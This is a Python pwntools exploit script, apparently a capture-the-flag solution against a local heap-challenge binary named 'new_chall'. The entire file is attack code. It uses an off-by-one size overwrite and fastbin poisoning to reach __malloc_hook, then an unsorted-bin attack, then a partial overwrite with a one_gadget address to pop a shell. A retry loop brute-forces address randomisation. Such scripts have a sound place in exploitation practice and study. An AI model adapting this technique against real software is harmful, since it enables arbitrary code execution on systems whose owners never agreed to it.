# -*- coding:utf-8 -*-
from pwn import* 
#context.log_level = 'debug' 
p = process('./new_chall') 
def create(size,idx):
    p.recv()
    p.sendline('1')
    p.recv()
    p.sendline(str(size))
    p.recv()
    p.sendline(str(idx)) 
    
def edit(idx,content):
    p.recv()
    p.sendline('2')
    p.recv()
    p.sendline(str(idx))
    p.recv()
    p.send(content) 
    
def delete(idx):
    p.recv()
    p.sendline('3')
    p.recv()
    p.sendline(str(idx)) 


def exp():
    p.recvuntil(":") 
    p.sendline("doom") 

    create(0x18,0) 
    # chunk0 0x20 
    create(0xc8,1) 
    # chunk1 d0 0x555555757030  
    create(0x65,2) 
    # chunk2 0x70 0x555555757100 
    fake = "A"*0x68 
    fake += p64(0x61) 
    ## fake size 
    edit(1,fake) 
    log.info('edit chunk 1 to fake') 
    #放入unsorted bin
    delete(1)

    #从unsorted bin 中取出，且fd存放main_arean+0x88指针
    create(0xc8,1) 

    create(0x65,3) 
    # chunk3 0x555555757170 
    create(0x65,15) 
    # chunk4 0x5555557571e0 
    create(0x65,18) 
    # chunk5 0x555555757250 

    over = "A"*0x18 
    # off by one 
    over += "\x71" 
    # set chunk 1's size --> 0x71 

    edit(0,over) 
    log.info('set chunk 1 size --> 0x71') 
    delete(2) 
    delete(3) 
    heap_po = "\x20" 
    edit(3,heap_po) 
    log.info('ADD b to fastbins list') 
    # malloc_hook-->[0x7ffff7dd1b10] 
    malloc_hook_nearly = "\xed\x1a" 
    #__malloc_hook - 0x23  
    edit(1,malloc_hook_nearly) 
    log.info("change B fd ") 
    create(0x65,0) 
    create(0x65,0) 
    create(0x65,0) 
    #malloc a chunk include malloc_hook 
    delete(15) 
    edit(15,p64(0))
    #fix fastbins list 
    log.info('fix fastbins list') 
    create(0xc8,1) 
    create(0xc8,1) 
    create(0x18,2) 
    create(0xc8,3) 
    create(0xc8,4) 
    delete(1) 
    po = "B"*8 
    po += "\x00\x1b" 
    #gdb.attach(p)
    edit(1,po) 
    create(0xc8,1) 
    log.info('use unsortbins attack change malloc_hook to main_arena + 0x88') 
    over = "R"*0x13 
    # padding for malloc_hook 
    #one_gadget 
    over += "\xa4\xd2\xaf" 
    edit(0,over) 
    delete(1)
    delete(1)
    p.interactive()
    p.close()

def one_more():
    try:
        exp()
    except:
        print "one more"
        p.close()
        global p
        p = process('./new_chall')
        one_more()
one_more()